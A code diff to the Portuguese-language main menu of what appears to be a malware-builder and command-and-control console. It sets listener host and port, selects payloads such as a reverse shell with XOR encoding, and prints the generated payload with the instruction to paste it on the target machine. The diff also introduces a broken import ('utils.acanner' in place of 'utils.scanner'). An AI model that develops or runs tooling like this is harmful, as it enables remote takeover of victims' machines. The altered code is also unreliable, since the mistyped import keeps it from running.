@@ -14,7 +14,7 @@ from utils.animations import loading_animation, show_random_banner
 from utils.helpers import clear_screen, print_status, print_error, print_success
 from core.server import C2Server
 from core.malware_factory import MalwareFactory
-from utils.scanner import Scanner
+from utils.acanner import Scanner
 
 def main():
     # Mostra animação de carregamento
@@ -48,7 +48,7 @@ def main():
                 handle_use_command(command, malware_factory, scanner)
                 
             elif command == "show options":
-                show_options()
+                show_options(server, malware_factory)
                 
             elif command == "show payloads":
                 malware_factory.list_payloads()
@@ -125,13 +125,12 @@ def handle_use_command(command, malware_factory, scanner):
     else:
         print_error(f"Módulo não encontrado: {module}")
 
-def show_options():
-    # Esta função será implementada para mostrar as opções atuais
+def show_options(server, malware_factory):
     print("Opções atuais:")
-    print("  LHOST    - 192.168.1.100")
-    print("  LPORT    - 4444")
-    print("  PAYLOAD  - reverse_shell")
-    print("  ENCODING - xor")
+    print(f"  LHOST    - {server.host}")
+    print(f"  LPORT    - {server.port}")
+    print(f"  PAYLOAD  - {malware_factory.current_payload or 'Nenhum'}")
+    print(f"  ENCODING - {malware_factory.encoding}")
 
 def handle_set_command(command, server, malware_factory):
     parts = command.split()
@@ -146,8 +145,11 @@ def handle_set_command(command, server, malware_factory):
         server.host = value
         print_success(f"LHOST => {value}")
     elif option == "LPORT":
-        server.port = int(value)
-        print_success(f"LPORT => {value}")
+        try:
+            server.port = int(value)
+            print_success(f"LPORT => {value}")
+        except ValueError:
+            print_error("LPORT deve ser um número")
     elif option == "PAYLOAD":
         malware_factory.select_payload(value)
     elif option == "ENCODING":
@@ -158,8 +160,12 @@ def handle_set_command(command, server, malware_factory):
 def handle_run_command(server, malware_factory):
     if malware_factory.current_payload:
         payload = malware_factory.generate_payload(server.host, server.port)
-        print_success("Payload gerado com sucesso!")
-        print(payload)
+        if payload:
+            print_success("Payload gerado com sucesso!")
+            print("\n" + "="*50)
+            print(payload)
+            print("="*50)
+            print_success("Copie e cole este código na máquina alvo")
     else:
         print_error("Nenhum payload selecionado. Use 'set PAYLOAD [tipo]'")
 
